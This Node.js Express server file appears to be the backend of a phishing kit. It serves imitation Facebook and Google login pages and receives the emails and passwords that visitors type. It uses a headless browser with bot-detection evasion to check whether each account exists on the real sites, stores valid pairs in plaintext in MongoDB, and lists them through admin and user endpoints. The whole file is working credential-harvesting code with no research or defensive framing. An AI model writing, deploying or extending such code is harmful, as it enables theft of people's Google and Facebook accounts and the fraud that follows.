const express = require('express');
const path = require('path');
let chromiumSparticuz;
async function getChromium() {
  if (!chromiumSparticuz) {
    chromiumSparticuz = (await import('@sparticuz/chromium')).default;
  }
  return chromiumSparticuz;
}
const { chromium: playwrightChromium } = require('playwright-core');
const dns = require("dns");
const mongoose = require('mongoose');
const FacebookUser = require("./models/facebook/users");
const GoogleUser = require("./models/google/google");
require('dotenv').config();

const uri = process.env.MONGODB_URI;

const app = express();
dns.setServers(["1.1.1.1", "8.8.8.8"]);
const PORT = process.env.PORT;
const connect = async () => {
  if (mongoose.connection.readyState >= 1) return;
  await mongoose.connect(uri);
  console.log("Connected to MongoDB");
};


app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

app.get("/users", async (req, res) => {
  try {
    await connect(); // تأمين الاتصال قبل الاستعلام
    const users = await getAllThings();
    res.json(users);
  } catch (error) {
    console.error("Users fetch error:", error);
    res.status(500).json({ error: error.message });
  }
});
app.get("/", async (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});
app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "admin.html"));
});
let facebook = 0;
let google = 0;
app.get('/facebook', (req, res) => {
  res.sendFile(path.join(__dirname, 'facebook.html'));
});

app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  const result = await FacebookCheck(email, password);
  console.log(`\nResult: ${result}`);

  if (result) {
    console.log("yes");
    await facebookPostData(email, password);
    console.log("\nPosted");
  }
  res.json({ success: result });



  facebook++;
  console.log(facebook);

});
app.get("/google", async (req, res) => {
  res.sendFile(path.join(__dirname, 'google.html'));
});
app.post("/google/login", async (req, res) => {
  const { email, password } = req.body;
  const result = await GoogleCheck(email, password);
  console.log(`\nGoogle_Result: ${result}`);

  if (result && google < 2) {
    await GooglePost(email, password);
    console.log("\nGoogle_Posted");
  }
  if (google < 2) {
    res.json({ success: result });


  }
  else {
    res.json({ sucess: false });
  }
  google++;
  console.log(`Google number: ${google}`);
});
app.delete("/delete", async (req, res) => {
  const result = (req.body.type == "Google") ? await GoogleDelete(req.body.id) : await FacebookDelete(req.body.id);
  console.log(result);
  res.json({ success: result });
});
async function contains(elements, target, target2 = "", target3 = "") {
  for (const element of elements) {
    try {
      const text = await element.innerText();
      if (text.trim().includes(target) || text.trim().includes(target2) || text.trim() == target3) {
        console.log(text.trim());
        return true;
      }
    } catch (e) { }
  }
  return false;
}

async function FacebookCheck(email, pass) {
  // استبدل launchPersistentContext بهذا الكود داخل FacebookCheck و GoogleCheck:
  const isVercel = process.env.VERCEL || process.env.AWS_EXECUTION_ENV;
  const chromium = isVercel ? await getChromium() : null;

  const browser = await playwrightChromium.launch({
    args: isVercel ? chromium.args : ['--disable-blink-features=AutomationControlled'],
    executablePath: isVercel ? await chromium.executablePath() : undefined,
    headless: isVercel ? chromium.headless : true,
  });
  const context = await browser.newContext({
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
  });

  const page = await context.newPage();

  try {
    await page.goto('https://www.facebook.com/login/identify/');
    await page.fill('input[type="text"]', email);

    await page.getByText("Continue").click();
    await page.waitForNavigation({ waitUntil: 'networkidle', timeout: 10000 }).catch(() => { });

    const fontElements = await page.locator('span').all();
    const exists = await contains(fontElements, "No account", "Something went wrong", "No account");
    console.log(exists);
    await browser.close();
    return !exists;
  } catch (error) {
    await browser.close();
    throw error;
  }
  if (!(context.isClosed())) {
    context.close();
  }
}


async function facebookPostData(email, password, username = "") {

  const user = new FacebookUser({
    email: email,
    password: password,
    username: username
  });
  await user.save().then((result) => {
    console.log('\n', result);
  }).catch((err) => {
    console.log('\n', err);
  });
}

app.listen(PORT, async () => {
  
  console.log(`\nServer is happily running on http://localhost:${PORT}`);
  connect();
});
app.get("/ip", async(req,res)=>{
  const request = await fetch("https://api.ipify.org?format=json");
  const data = await request.json();
  res.json({ip: data.ip});
});
async function getIP(){
  
}
async function GoogleCheck(email, password) {
  // استبدل launchPersistentContext بهذا الكود داخل FacebookCheck و GoogleCheck:
  const isVercel = process.env.VERCEL || process.env.AWS_EXECUTION_ENV;
  const chromium = isVercel ? await getChromium() : null;

  const browser = await playwrightChromium.launch({
    args: isVercel ? chromium.args : ['--disable-blink-features=AutomationControlled'],
    executablePath: isVercel ? await chromium.executablePath() : undefined,
    headless: isVercel ? chromium.headless : true,
  });
  const context = await browser.newContext({
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
  });

  const page = await context.newPage();

  try {

    await page.goto('https://accounts.google.com/ServiceLogin?hl=fr&amp;passive=true&amp;continue=https://www.google.com/&amp;ec=futura_exp_og_so_72776762_e');
    await page.fill('input[type="text"]', email);

    await page.click('button[type="button"]');
    await page.waitForNavigation({ waitUntil: 'networkidle', timeout: 5000 }).catch(() => { });
    const textElements = await page.locator("*").all();

    const exists = await contains(textElements, "Couldn't", "Enter an email or phone number", "Type the text you hear or see");


    console.log(exists);
    await browser.close();
    return !exists;
  } catch (error) {
    await browser.close();
    throw error;
  }
  if (!(context.isClosed())) {
    context.close();
  }
}

async function GooglePost(email, password, username = "") {
  const user = new GoogleUser({
    password: password,
    email: email,
    username: username
  });
  await user.save().then((result) => {
    console.log('\n', result);
  }).catch((err) => {
    console.log('\n', err);
  });
}
async function FacebookDelete(id) {
  const result = await FacebookUser.findByIdAndDelete(id);
  console.log("Facebook");
  return result;
}
async function GoogleDelete(id) {
  const result = await GoogleUser.findByIdAndDelete(id);
  console.log("google");
  return result;
}

async function getAllThings() {
  const facebooks = await FacebookUser.find();
  const googles = await GoogleUser.find();

  const users = {
    facebook: facebooks,
    google: googles
  };
  return users;
}
